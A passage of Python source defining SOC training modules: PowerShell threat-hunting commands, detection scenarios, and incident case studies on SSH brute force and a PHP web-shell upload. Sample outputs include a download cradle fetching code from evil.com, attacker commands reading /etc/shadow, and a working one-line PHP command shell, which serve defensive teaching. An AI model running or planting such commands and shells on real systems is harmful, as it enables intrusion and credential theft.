     "output": "SignerCertificate                         Status\n-----------------                         ------\n                                          NotSigned",
     "simulation": [
         {"from": "Get-AuthenticodeSignature", "to": "File", "data": "Read signature", "title": "Check", "desc": "Reads embedded certificate", "color": "#3498db"},
         {"from": "File", "to": "Pipeline", "data": "No cert", "title": "NotSigned", "desc": "No publisher = suspicious", "color": "#e74c3c"},
         {"from": "Terminal", "to": "Analyst", "data": "Unsigned binary", "title": "Flag", "desc": "Potential malware", "color": "#f39c12"}
     ]},

    # ============================================================
    # PERSISTENCE HUNTING
    # ============================================================
    {"id": "ps_17", "category": "Persistence Hunting", "color": "#9b59b6",
     "cmd": "Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\\Microsoft\\*'} | Select-Object TaskName, TaskPath, State",
     "desc": "List non-Microsoft scheduled tasks — persistence indicator",
     "scenario": "Windows has many built-in tasks under \\Microsoft\\. Anything outside that folder was added by software or an attacker. Get-ScheduledTask lists them all. Filter out Microsoft tasks to focus on the interesting ones.",
     "output": "TaskName          TaskPath    State\n--------          --------    -----\nUpdater           \\           Ready\nWindowsUpdateSvc  \\           Ready",
     "simulation": [
         {"from": "Get-ScheduledTask", "to": "Task Scheduler", "data": "All tasks", "title": "Query", "desc": "Every scheduled task", "color": "#3498db"},
         {"from": "Where-Object", "to": "Pipeline", "data": "Not Microsoft", "title": "Filter", "desc": "Skip built-in tasks", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "Non-standard tasks", "title": "Investigate", "desc": "Potential persistence", "color": "#9b59b6"}
     ]},
    {"id": "ps_18", "category": "Persistence Hunting", "color": "#9b59b6",
     "cmd": "Get-Service | Where-Object {$_.Status -eq 'Running' -and $_.StartType -eq 'Automatic'} | Select-Object Name, DisplayName, Status",
     "desc": "List auto-start services currently running",
     "scenario": "Attackers often install services for persistence. Every auto-start service runs on boot. Legitimate software adds services; so does malware. Look for services with odd names or paths outside Program Files.",
     "output": "Name              DisplayName       Status\n----              -----------       ------\nSpooler           Print Spooler     Running\nWinDefend         Windows Defender  Running\nSuspiciousSvc     System Helper     Running",
     "simulation": [
         {"from": "Get-Service", "to": "SCM", "data": "All services", "title": "Query", "desc": "Every Windows service", "color": "#3498db"},
         {"from": "Where-Object", "to": "Pipeline", "data": "Auto + Running", "title": "Filter", "desc": "Only persistent + live ones", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "SuspiciousSvc", "title": "Spot", "desc": "Odd name = investigate", "color": "#9b59b6"}
     ]},
    {"id": "ps_19", "category": "Persistence Hunting", "color": "#9b59b6",
     "cmd": "Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User",
     "desc": "List everything that runs at startup — Run keys, Startup folder, etc.",
     "scenario": "This combines all startup locations into one query: HKCU/HKLM Run keys, Startup folder, and more. Every entry is a persistence mechanism. Look for entries with paths in AppData, Temp, or ProgramData — those are common malware locations.",
     "output": "Name        Command                              Location       User\n----        -------                              --------       ----\nOneDrive    C:\\...\\OneDrive.exe                  Startup        alice\nUpdater     C:\\Users\\Public\\update.exe          HKLM\\Run       Public",
     "simulation": [
         {"from": "WMI", "to": "Registry + FS", "data": "Startup locations", "title": "Query", "desc": "All autorun locations", "color": "#3498db"},
         {"from": "Pipeline", "to": "Terminal", "data": "Entries", "title": "List", "desc": "Name, command, location", "color": "#f39c12"},
         {"from": "Analyst", "to": "IOC", "data": "Users\\Public", "title": "Spot", "desc": "Suspicious path = malware", "color": "#9b59b6"}
     ]},

    # ============================================================
    # ADVANCED DETECTION
    # ============================================================
    {"id": "ps_20", "category": "Advanced Detection", "color": "#c0392b",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=10} | Where-Object {$_.Message -match 'lsass.exe'}",
     "desc": "Detect LSASS access — credential theft attempt (Sysmon Event 10)",
     "scenario": "LSASS holds password hashes in memory. Mimikatz, ProcDump, and comsvcs.dll all access LSASS to steal credentials. Sysmon Event 10 logs every process access. Any non-standard tool accessing lsass.exe is a red alert.",
     "output": "TimeCreated        Message\n-----------        -------\n1/15/2024 2:30 PM  SourceImage: mimikatz.exe TargetImage: lsass.exe GrantedAccess: 0x1410",
     "simulation": [
         {"from": "mimikatz", "to": "LSASS", "data": "OpenProcess", "title": "Attempt theft", "desc": "Read LSASS memory", "color": "#e74c3c"},
         {"from": "Kernel", "to": "Sysmon", "data": "Event 10", "title": "Logged", "desc": "Sysmon catches the access", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "lsass match", "title": "Alert", "desc": "Credential theft detected", "color": "#c0392b"}
     ]},
    {"id": "ps_21", "category": "Advanced Detection", "color": "#c0392b",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} -MaxEvents 5000 | Where-Object {$_.Properties[7].Value -eq '0x17' -and $_.Properties[0].Value -notlike '*$*'} | Group-Object Account | Where-Object {$_.Count -gt 5}",
     "desc": "Detect Kerberoasting — RC4 service ticket requests (Event 4769)",
     "scenario": "Kerberoasting requests service tickets with weak RC4 encryption, then cracks them offline. Event 4769 fires on every service ticket request. Filtering for RC4 (0x17) and non-machine accounts, then grouping by account, reveals accounts with many RC4 requests — the Kerberoasting signature.",
     "output": "Count Name\n----- ----\nsql_svc    12",
     "simulation": [
         {"from": "Attacker", "to": "KDC", "data": "TGS request for sql_svc", "title": "Request", "desc": "Ask for service ticket", "color": "#e74c3c"},
         {"from": "KDC", "to": "Event 4769", "data": "RC4 encrypted ticket", "title": "Log", "desc": "Weak encryption requested", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "12 requests", "title": "Alert", "desc": "Kerberoasting in progress", "color": "#c0392b"}
     ]},
    {"id": "ps_22", "category": "Advanced Detection", "color": "#c0392b",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4662} -MaxEvents 5000 | Where-Object {$_.Properties[8].Value -match '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'}",
     "desc": "Detect DCSync — replication permission misuse (Event 4662)",
     "scenario": "DCSync impersonates a domain controller to pull password hashes from AD. Event 4662 fires when directory service access occurs. The specific GUIDs in Properties[8] are the DS-Replication permissions — any use outside of a real DC is a DCSync attempt.",
     "output": "TimeCreated        Message\n-----------        -------\n1/15/2024 2:45 PM  Account Name: alice Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
     "simulation": [
         {"from": "Attacker", "to": "AD", "data": "DCSync request", "title": "Impersonate DC", "desc": "Ask AD for password hashes", "color": "#e74c3c"},
         {"from": "AD", "to": "Event 4662", "data": "Replication access", "title": "Log", "desc": "Directory access recorded", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "GUID match", "title": "Alert", "desc": "DCSync detected", "color": "#c0392b"}
     ]},

    # ============================================================
    # REAL SOC SCENARIOS
    # ============================================================
    {"id": "ps_23", "category": "Real SOC Scenarios", "color": "#e67e22",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} | Where-Object {$_.Message -match 'powershell.*-enc|cmd.*/c|wscript|cscript|mshta'} | Select-Object TimeCreated, Message",
     "desc": "Detect suspicious process creation — encoded commands, script hosts",
     "scenario": "Event 4688 fires on every process creation (if command-line auditing is on). Filtering for encoded PowerShell, cmd /c, and script hosts (wscript, cscript, mshta) surfaces the classic attack execution patterns. These are Living-off-the-Land binaries.",
     "output": "TimeCreated        Message\n-----------        -------\n1/15/2024 2:23 PM  Process: powershell.exe CommandLine: powershell.exe -enc SQBFAFgA...",
     "simulation": [
         {"from": "Attacker", "to": "Windows", "data": "powershell -enc", "title": "Execute", "desc": "Encoded command launched", "color": "#e74c3c"},
         {"from": "Windows", "to": "Event 4688", "data": "Process created", "title": "Log", "desc": "Command line recorded", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "Pattern match", "title": "Alert", "desc": "Suspicious execution", "color": "#e67e22"}
     ]},
    {"id": "ps_24", "category": "Real SOC Scenarios", "color": "#e67e22",
     "cmd": "Get-CimInstance Win32_Process | Where-Object {$_.CommandLine -match 'DownloadString|IEX|Invoke-Expression|FromBase64String'} | Select-Object ProcessId, Name, CommandLine",
     "desc": "Hunt for download cradles in currently running processes",
     "scenario": "Before you have 4688 logging, you can still catch live malicious processes. This scans currently running processes for the classic download cradle patterns: IEX, DownloadString, Invoke-Expression, FromBase64String. If you find one, that process is actively fetching and running remote code.",
     "output": "ProcessId Name           CommandLine\n--------- ----           -----------\n5678      powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
     "simulation": [
         {"from": "WMI", "to": "Pipeline", "data": "All processes", "title": "Query", "desc": "Every process + args", "color": "#3498db"},
         {"from": "Where-Object", "to": "Pipeline", "data": "IEX|DownloadString", "title": "Filter", "desc": "Download cradle patterns", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "Match found", "title": "Alert", "desc": "Active malware running", "color": "#e74c3c"}
     ]},
    {"id": "ps_25", "category": "Real SOC Scenarios", "color": "#e67e22",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4732,4728} -MaxEvents 100 | Select-Object TimeCreated, Id, Message",
     "desc": "Detect users added to privileged groups — privilege escalation",
     "scenario": "Event 4732 = user added to a local group. Event 4728 = user added to a global group. Attackers add accounts to Administrators or Domain Admins for persistence. Any addition outside a change window is suspicious.",
     "output": "TimeCreated        Id   Message\n-----------        --   -------\n1/15/2024 2:50 PM  4732 A member was added to a security-enabled local group: alice → Administrators",
     "simulation": [
         {"from": "Attacker", "to": "AD", "data": "net localgroup add", "title": "Escalate", "desc": "Add account to Admins", "color": "#e74c3c"},
         {"from": "Windows", "to": "Event 4732", "data": "Group change", "title": "Log", "desc": "Membership change recorded", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "4732 found", "title": "Alert", "desc": "Privilege escalation", "color": "#e67e22"}
     ]},
]

POWERSHELL_SCENARIOS = [
    {"id": "ps_sc_1", "title": "Spot RDP Brute Force via Event 4625",
     "icon": "🔨", "color": "#e74c3c",
     "situation": "A server shows hundreds of failed RDP logons from one external IP.",
     "detection_cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} | Group-Object -Property {$_.Properties[5].Value} | Sort-Object Count -Descending | Select-Object -First 5",
     "detection_output": "Count Name\n----- ----\n 4521 203.0.113.5\n  234 198.51.100.42",
     "analysis": "4521 failed RDP logons from one IP = automated brute force. The Properties[5] field holds the source IP for 4625 events.",
     "response_cmds": [
         "New-NetFirewallRule -DisplayName 'Block Attacker' -Direction Inbound -RemoteAddress 203.0.113.5 -Action Block",
         "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Where-Object {$_.Properties[18].Value -eq '203.0.113.5'}",
         "Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -eq '203.0.113.5'}"
     ],
     "post_action": "Attacker IP blocked at Windows Firewall. Event 4624 check confirms no successful logon ever happened from that IP. TCP check confirms no active session.",
     "simulation": [
         {"from": "Attacker 203.0.113.5", "to": "RDP:3389", "data": "Login attempts", "title": "Attack starts", "desc": "Automated tool hits RDP", "color": "#e74c3c"},
         {"from": "Windows", "to": "Event 4625", "data": "Failed logon", "title": "Logged", "desc": "Each failure written to Security log", "color": "#f39c12"},
         {"from": "Analyst", "to": "Firewall", "data": "New-NetFirewallRule Block", "title": "Block IP", "desc": "Attacker dropped instantly", "color": "#27ae60"}
     ]},
    {"id": "ps_sc_2", "title": "Detect Credential Dumping via LSASS Access",
     "icon": "🔓", "color": "#c0392b",
     "situation": "Sysmon Event 10 fires repeatedly — something is accessing LSASS memory.",
     "detection_cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=10} | Where-Object {$_.Message -match 'lsass.exe'} | Select-Object TimeCreated, @{N='Source';E={$_.Properties[2].Value}}, @{N='GrantedAccess';E={$_.Properties[6].Value}}",
     "detection_output": "TimeCreated        Source         GrantedAccess\n-----------        ------         -------------\n1/15/2024 2:30 PM  mimikatz.exe   0x1410",
     "analysis": "mimikatz.exe accessing lsass.exe with GrantedAccess 0x1410 = credential dumping in progress. Legitimate processes don't access LSASS with this mask.",
     "response_cmds": [
         "Stop-Process -Name mimikatz -Force",
         "Get-Process | Where-Object {$_.Path -like '*Temp*' -or $_.Path -like '*Public*'}",
         "Get-CimInstance Win32_Service | Where-Object {$_.PathName -like '*Temp*' -or $_.PathName -like '*Public*'}"
     ],
     "post_action": "Malicious process killed. Follow-up commands check for other files and services running from suspicious paths. Isolate the host and rotate credentials.",
     "simulation": [
         {"from": "mimikatz", "to": "LSASS", "data": "OpenProcess 0x1410", "title": "Read memory", "desc": "Attempt credential dump", "color": "#e74c3c"},
         {"from": "Sysmon", "to": "Event 10", "data": "Access logged", "title": "Detected", "desc": "Sysmon catches LSASS access", "color": "#f39c12"},
         {"from": "Analyst", "to": "Process", "data": "Stop-Process -Force", "title": "Kill", "desc": "Malware terminated", "color": "#27ae60"}
     ]},
    {"id": "ps_sc_3", "title": "Investigate Suspicious Outbound Connection",
     "icon": "🌐", "color": "#16a085",
     "situation": "An endpoint is beaconing to an unknown external IP on port 443.",
     "detection_cmd": "Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -notmatch '^(127\\.|10\\.|192\\.168\\.)'} | ForEach-Object { $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue; [PSCustomObject]@{Remote=$_.RemoteAddress; Port=$_.RemotePort; Process=$proc.Name; Path=$proc.Path} }",
     "detection_output": "Remote        Port Process       Path\n------        ---- -------       ----\n185.234.72.11 443  rundll32.exe  C:\\Users\\Public\\svchost.exe",
     "analysis": "rundll32.exe running from C:\\Users\\Public (not System32) connecting to an external IP on 443 = strong C2 indicator. Legitimate rundll32 runs from System32.",
     "response_cmds": [
         "Get-Process -Id (Get-NetTCPConnection -RemoteAddress '185.234.72.11').OwningProcess",
         "Get-FileHash 'C:\\Users\\Public\\svchost.exe'",
         "Get-AuthenticodeSignature 'C:\\Users\\Public\\svchost.exe'"
     ],
     "post_action": "Process identified, file hashed for IOC lookup, signature verified (NotSigned). The file is malware masquerading as a system process. Isolate the host.",
     "simulation": [
         {"from": "Malware", "to": "C2 Server", "data": "Beacon :443", "title": "Callback", "desc": "Malware reaches its controller", "color": "#e74c3c"},
         {"from": "Analyst", "to": "Get-NetTCPConnection", "data": "List external", "title": "Detect", "desc": "See the suspicious IP", "color": "#f39c12"},
         {"from": "Analyst", "to": "Host", "data": "Isolate", "title": "Respond", "desc": "Cut network, hash file, rotate creds", "color": "#27ae60"}
     ]}
]


MODULES["powershell"] = {
    "key": "powershell",
    "title": "PowerShell for SOC",
    "icon": "💻",
    "template": "powershell.html",
    "intro": {
        "what": (
            "PowerShell is the primary administrative shell on Windows, built on .NET and working with objects "
            "instead of plain text. For a SOC analyst it is a double-edged sword: administrators use it for "
            "legitimate automation, and attackers abuse it heavily because it is signed, trusted, and already "
            "present on every Windows machine. Mastering PowerShell means you can investigate endpoints, parse "
            "event logs, hunt IOCs, and detect Living-off-the-Land attacks — all without deploying a single tool."
        ),
        "why_soc": [
            "Parse Windows Event Logs at scale — Get-WinEvent filters by log, ID, time, and level",
            "Investigate live endpoints — list processes, network connections, and services in seconds",
            "Hunt persistence — scheduled tasks, services, WMI subscriptions, Run keys",
            "Detect credential theft — LSASS access (Sysmon 10), DCSync, Kerberoasting",
            "Automate triage — pipe results to CSV/JSON for SIEM ingestion",
            "Understand attacker behavior — the same commands attackers use are the ones you detect"
        ]
    },
    "commands": POWERSHELL_COMMANDS,
    "scenarios": POWERSHELL_SCENARIOS,
    "extra": {}
}

# ==================== MODULE: CASE STUDIES ====================
MODULES["cases"] = {
    "key": "cases",
    "title": "Case Studies",
    "icon": "📁",
    "template": "cases.html",
    "intro": {
        "what": (
            "Real attack investigations, told end to end. Each case study walks through a genuine SOC incident: "
            "the initial alert, the detection commands the analyst ran, the evidence they found, the response "
            "actions they took, and what the post-incident review revealed."
        ),
        "why_soc": [
            "Learn the real investigation flow — alert → triage → evidence → response → review",
            "See how logs, firewall, and endpoint data correlate into one story",
            "Practice the exact commands analysts run in the heat of an incident",
            "Understand attacker tactics mapped to MITRE ATT&CK techniques",
            "Study post-mortems to prevent recurrence — the most valuable SOC skill"
        ]
    },
    "commands": [],   # not used for cases — each case has its own `commands`
    "scenarios": [],
    "extra": {
        "cases": [
            # ============================================================
            # CASE 1
            # ============================================================
            {
                "id": "case_1",
                "number": "Case 1",
                "title": "SSH Brute Force → Successful Breach",
                "icon": "🔨",
                "color": "#e74c3c",
                "severity": "CRITICAL",
                "mitre": ["T1110.001 — Brute Force: Password Guessing",
                          "T1078 — Valid Accounts",
                          "T1003 — OS Credential Dumping"],

                "story": {
                    "headline": "02:14 AM — Alerting fires on prod-web-01",
                    "paragraphs": [
                        "You're on shift. The pager buzzes: 'Unusual SSH failure rate on prod-web-01 — 600+ failures in the last hour.'",
                        "You SSH into the box (from a trusted IP, on a key) and start triage. The auth log is filling with failures. One IP dominates: 203.0.113.5.",
                        "You filter auth.log for that IP and see the same pattern over and over — different usernames (admin, root, test, ubuntu), different passwords, hundreds of attempts per minute. This is an automated brute force, not a user having a bad day.",
                        "Then you run the second query every analyst must run. You filter auth.log for 'Accepted' lines from that IP.",
                        "The result changes everything."
                    ],
                    "cliffhanger": "03:47 AM — one 'Accepted password for alice from 203.0.113.5'. The attacker got in."
                },

                "playbook": {
                    "headline": "What you need to do — in order",
                    "steps": [
                        {"n": 1, "title": "Confirm the attack", "detail": "Count failures per source IP to identify the attacker."},
                        {"n": 2, "title": "Check for success", "detail": "Search for 'Accepted' lines from the same IP. This is the pivotal step."},
                        {"n": 3, "title": "Trace attacker activity", "detail": "Read every sudo command the compromised user ran. Reconstruct the timeline."},
                        {"n": 4, "title": "Contain", "detail": "Block the IP at the firewall, lock the compromised account, force password reset."},
                        {"n": 5, "title": "Preserve evidence", "detail": "Copy relevant log lines to /evidence/ before anything rotates."},
                        {"n": 6, "title": "Prevent recurrence", "detail": "Enable SSH keys only, add fail2ban, enforce MFA."}
                    ]
                },

                "commands": [
                    {"id": "case1_c1", "category": "Case 1 — Practice", "color": "#f39c12",
                     "cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
                     "desc": "Count failed logins per source IP — your first triage move",
                     "scenario": "You need to know WHO is attacking. This pipeline extracts the source IP (3rd field from the end), counts them, and shows the top 10.",
                     "output": "  642 203.0.113.5\n   58 198.51.100.42\n   23 192.0.2.77\n   12 45.33.22.11",
                     "simulation": [
                         {"from": "auth.log", "to": "grep", "data": "Failed password", "title": "Filter failures", "desc": "Only failed attempts kept", "color": "#3498db"},
                         {"from": "grep", "to": "awk", "data": "$(NF-3)", "title": "Extract IP", "desc": "3rd field from end = source IP", "color": "#f39c12"},
                         {"from": "awk", "to": "sort | uniq -c", "data": "Rank + count", "title": "Rank", "desc": "Biggest attacker shown first", "color": "#e74c3c"}
                     ]},
                    {"id": "case1_c2", "category": "Case 1 — Practice", "color": "#c0392b",
                     "cmd": "sudo grep 'Accepted' /var/log/auth.log | grep '203.0.113.5'",
                     "desc": "THE pivotal command — did the attack succeed?",
                     "scenario": "You've identified the attacker. Now the only question that matters: did they get in? Empty output = they failed. Any output = they have valid credentials and are inside.",
                     "output": "Mar 15 03:47:12 prod-web-01 sshd[4521]: Accepted password for alice from 203.0.113.5 port 54321 ssh2",
                     "simulation": [
                         {"from": "auth.log", "to": "grep", "data": "Accepted", "title": "Find successes", "desc": "All successful logins", "color": "#27ae60"},
                         {"from": "grep", "to": "Stream", "data": "203.0.113.5", "title": "Filter by IP", "desc": "Only attacker's IP", "color": "#f39c12"},
                         {"from": "Stream", "to": "Terminal", "data": "alice accepted", "title": "BREACH", "desc": "Attacker is inside", "color": "#c0392b"}
                     ]},
                    {"id": "case1_c3", "category": "Case 1 — Practice", "color": "#c0392b",
                     "cmd": "sudo grep 'alice' /var/log/auth.log | grep 'COMMAND=' | tail -20",
                     "desc": "Reconstruct what the attacker did after logging in",
                     "scenario": "The attacker had sudo. Every command they ran is logged with the full command line. Read them to understand impact and reconstruct the attack timeline.",
                     "output": "03:48:01 sudo: alice : COMMAND=/bin/cat /etc/passwd\n03:49:15 sudo: alice : COMMAND=/usr/bin/whoami\n03:50:22 sudo: alice : COMMAND=/usr/bin/find / -name '*.key'\n03:52:40 sudo: alice : COMMAND=/bin/cat /etc/shadow\n03:55:12 sudo: alice : COMMAND=/usr/bin/tar czf /tmp/d.tar.gz /var/www",
                     "simulation": [
                         {"from": "Attacker", "to": "Server", "data": "cat /etc/passwd", "title": "Recon", "desc": "Enumerate users", "color": "#f39c12"},
                         {"from": "Attacker", "to": "Server", "data": "cat /etc/shadow", "title": "Cred theft", "desc": "Dump password hashes", "color": "#c0392b"},
                         {"from": "Attacker", "to": "Server", "data": "tar /var/www", "title": "Exfil staging", "desc": "Bundle files for theft", "color": "#e74c3c"}
                     ]},
                    {"id": "case1_c4", "category": "Case 1 — Practice", "color": "#e74c3c",
                     "cmd": "sudo ufw deny from 203.0.113.5",
                     "desc": "Contain — block the attacker at the firewall",
                     "scenario": "Do this BEFORE deeper forensics. The attacker is still inside; every minute they remain connected they can do more damage. Cut them off first.",
                     "output": "Rule added",
                     "simulation": [
                         {"from": "Analyst", "to": "ufw", "data": "deny from IP", "title": "Block", "desc": "Rule added to firewall", "color": "#27ae60"},
                         {"from": "ufw", "to": "iptables", "data": "DROP 203.0.113.5", "title": "Apply", "desc": "Kernel drops all packets", "color": "#3498db"},
                         {"from": "Firewall", "to": "Attacker", "data": "Silent drop", "title": "Attacker cut off", "desc": "Their session dies", "color": "#f39c12"}
                     ]},
                    {"id": "case1_c5", "category": "Case 1 — Practice", "color": "#27ae60",
                     "cmd": "sudo usermod -L alice && sudo passwd alice",
                     "desc": "Lock the compromised account and force a password reset",
                     "scenario": "Even with the IP blocked, the attacker may have exfiltrated credentials and can log in from elsewhere. Lock the account and reset the password before they try again.",
                     "output": "usermod: account 'alice' password changed\npasswd: password updated successfully",
                     "simulation": [
                         {"from": "Analyst", "to": "Account", "data": "usermod -L", "title": "Lock", "desc": "Login disabled", "color": "#27ae60"},
                         {"from": "Analyst", "to": "Account", "data": "passwd alice", "title": "Reset", "desc": "New password required", "color": "#3498db"},
                         {"from": "Attacker", "to": "Server", "data": "Login attempt", "title": "Locked out", "desc": "Old creds no longer work", "color": "#f39c12"}
                     ]},
                    {"id": "case1_c6", "category": "Case 1 — Practice", "color": "#9b59b6",
                     "cmd": "sudo ufw limit ssh",
                     "desc": "Prevent recurrence — rate-limit SSH at the firewall",
                     "scenario": "Blocking one IP doesn't stop the next attacker. Rate-limiting SSH at the firewall drops any IP making more than 6 connections in 30 seconds. This is a one-line defense against future brute force.",
                     "output": "Rule added\nRule added (v6)",
                     "simulation": [
                         {"from": "Legit user", "to": "SSH:22", "data": "Connection", "title": "Allowed", "desc": "Normal use works fine", "color": "#27ae60"},
                         {"from": "Next attacker", "to": "SSH:22", "data": "Attempts 7+", "title": "Rate exceeded", "desc": "Threshold crossed", "color": "#f39c12"},
                         {"from": "ufw", "to": "Attacker", "data": "BLOCKED 30s", "title": "Auto-block", "desc": "Future attackers slowed", "color": "#c0392b"}
                     ]}
                ],

                "resolution": {
                    "headline": "✅ How it ended",
                    "summary": "Attacker blocked, account locked, password reset, SSH rate-limited. auditd replay confirmed the full 2.5-hour session: recon → credential dump → data staging. No exfiltration completed (the tar file was never transferred out).",
                    "root_cause": "Single-factor SSH with password auth. Alice used a password on the top-10k list.",
                    "fixes": [
                        "Disable SSH password authentication globally (PasswordAuthentication no)",
                        "Enforce SSH keys only for all users",
                        "Enable MFA for privileged accounts",
                        "Deploy fail2ban with a 1-hour bantime",
                        "Alert on any single IP with >50 failed logins in 5 minutes"
                    ]
                }
            },

            # ============================================================
            # CASE 2
            # ============================================================
            {
                "id": "case_2",
                "number": "Case 2",
                "title": "Web Shell via File Upload",
                "icon": "🐚",
                "color": "#e67e22",
                "severity": "HIGH",
                "mitre": ["T1505.003 — Server Software Component: Web Shell",
                          "T1190 — Exploit Public-Facing Application"],

                "story": {
                    "headline": "14:00 — Users report the website is 'acting weird'",
                    "paragraphs": [
                        "A support ticket lands: 'our site is slow and sometimes redirects to strange pages.'",
                        "You pull up the Apache access log and immediately notice something odd — hundreds of requests to /uploads/shell.php. Upload directories should never contain executable PHP.",
                        "The requests come from one IP: 203.0.113.5. Each one has a parameter like ?cmd=id or ?cmd=cat%20/etc/passwd. Someone uploaded a web shell and is running commands through it.",
                        "You check the file system. The upload form accepts anything — including PHP — and /uploads/ executes PHP. The attacker has a remote shell on your web server."
                    ],
                    "cliffhanger": "How many shells did they drop? And what did they already run through them?"
                },

                "playbook": {
                    "headline": "What you need to do — in order",
                    "steps": [
                        {"n": 1, "title": "Confirm the intrusion", "detail": "Search the access log for PHP files in /uploads/."},
                        {"n": 2, "title": "Read the shell", "detail": "Preserve and inspect the payload before deleting it."},
                        {"n": 3, "title": "Find all shells", "detail": "Attackers drop multiple backdoors. Search for all recently created PHP files."},
                        {"n": 4, "title": "Contain", "detail": "Remove every shell. Restart Apache to kill active sessions. Block the attacker IP."},
                        {"n": 5, "title": "Fix the upload bug", "detail": "Validate MIME types. Forbid PHP execution in /uploads/."},
                        {"n": 6, "title": "Audit other systems", "detail": "Check for the same vulnerable code on other hosts."}
                    ]
                },

                "commands": [
                    {"id": "case2_c1", "category": "Case 2 — Practice", "color": "#f39c12",
                     "cmd": "sudo grep 'uploads.*\\.php' /var/log/apache2/access.log | tail -20",
                     "desc": "Search for PHP files executing in the upload directory",
                     "scenario": "PHP files in /uploads/ are always suspicious — that folder is for user content, not code. This grep reveals the web shell activity immediately.",
                     "output": "203.0.113.5 - - [15/Mar/2024:14:35:10] \"POST /uploads/shell.php HTTP/1.1\" 200 1234\n203.0.113.5 - - [15/Mar/2024:14:35:15] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 45\n203.0.113.5 - - [15/Mar/2024:14:35:20] \"GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1\" 200 2048",
                     "simulation": [
                         {"from": "Attacker", "to": "Web App", "data": "POST shell.php", "title": "Upload", "desc": "Malicious PHP uploaded", "color": "#e74c3c"},
                         {"from": "Apache", "to": "access.log", "data": "200 OK", "title": "Logged", "desc": "Every request recorded", "color": "#f39c12"},
                         {"from": "grep", "to": "Analyst", "data": "847 hits", "title": "Confirmed", "desc": "Web shell is active", "color": "#c0392b"}
                     ]},
                    {"id": "case2_c2", "category": "Case 2 — Practice", "color": "#c0392b",
                     "cmd": "sudo cp /var/www/html/uploads/shell.php /evidence/ && sudo cat /var/www/html/uploads/shell.php",
                     "desc": "Preserve the shell, then read it to understand its capability",
                     "scenario": "Never delete a shell before preserving it. Copy to /evidence/ first, then read it. The code tells you what the attacker can do — usually run arbitrary OS commands.",
                     "output": "<?php\nif(isset($_REQUEST['cmd'])){\n    echo \"<pre>\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"</pre>\";\n    die;\n}\n?>",
                     "simulation": [
                         {"from": "Analyst", "to": "Filesystem", "data": "cp to /evidence/", "title": "Preserve", "desc": "Original kept as evidence", "color": "#3498db"},
                         {"from": "Analyst", "to": "File", "data": "cat shell.php", "title": "Read", "desc": "Understand what it does", "color": "#f39c12"},
                         {"from": "File", "to": "Analyst", "data": "system($cmd)", "title": "Identify", "desc": "Runs any OS command as web user", "color": "#e74c3c"}
                     ]},
                    {"id": "case2_c3", "category": "Case 2 — Practice", "color": "#f39c12",
                     "cmd": "sudo find /var/www -name '*.php' -newermt '1 day ago'",
                     "desc": "Find every PHP file modified in the last 24 hours",
                     "scenario": "Attackers usually drop more than one shell. This finds any PHP file created recently — including hidden ones in .cache/ or wp-content/.",
                     "output": "/var/www/html/uploads/shell.php\n/var/www/html/wp-content/wp-config.php.bak.php\n/var/www/html/.cache/update.php",
                     "simulation": [
                         {"from": "Analyst", "to": "Filesystem", "data": "find -newermt 1d", "title": "Scan", "desc": "Walk entire web root", "color": "#3498db"},
                         {"from": "Filesystem", "to": "Analyst", "data": "3 files", "title": "Multiple shells", "desc": "Attacker left backups", "color": "#e74c3c"},
                         {"from": "Analyst", "to": "Evidence", "data": "tar them all", "title": "Preserve", "desc": "Archive before deleting", "color": "#f39c12"}
                     ]},
                    {"id": "case2_c4", "category": "Case 2 — Practice", "color": "#e74c3c",
                     "cmd": "sudo ufw deny from 203.0.113.5",
                     "desc": "Block the attacker IP at the firewall",
                     "scenario": "Even before you clean up, block the attacker. Otherwise they can re-upload the shell while you're deleting files.",
                     "output": "Rule added",
                     "simulation": [
                         {"from": "Analyst", "to": "ufw", "data": "deny 203.0.113.5", "title": "Block", "desc": "Attacker cut off", "color": "#27ae60"},
                         {"from": "ufw", "to": "iptables", "data": "DROP", "title": "Apply", "desc": "Kernel drops packets", "color": "#3498db"},
                         {"from": "Attacker", "to": "Web Server", "data": "Retry", "title": "Blocked", "desc": "Cannot re-upload", "color": "#f39c12"}
                     ]},
                    {"id": "case2_c5", "category": "Case 2 — Practice", "color": "#27ae60",
                     "cmd": "sudo rm /var/www/html/uploads/shell.php /var/www/html/.cache/update.php && sudo systemctl restart apache2",
                     "desc": "Remove every shell and restart Apache to kill sessions",
                     "scenario": "Deleting the file removes the backdoor, but any PHP session already running needs to die. Restarting Apache terminates every in-flight shell session.",
                     "output": "(files removed)\nJob for apache2.service completed successfully.",
                     "simulation": [
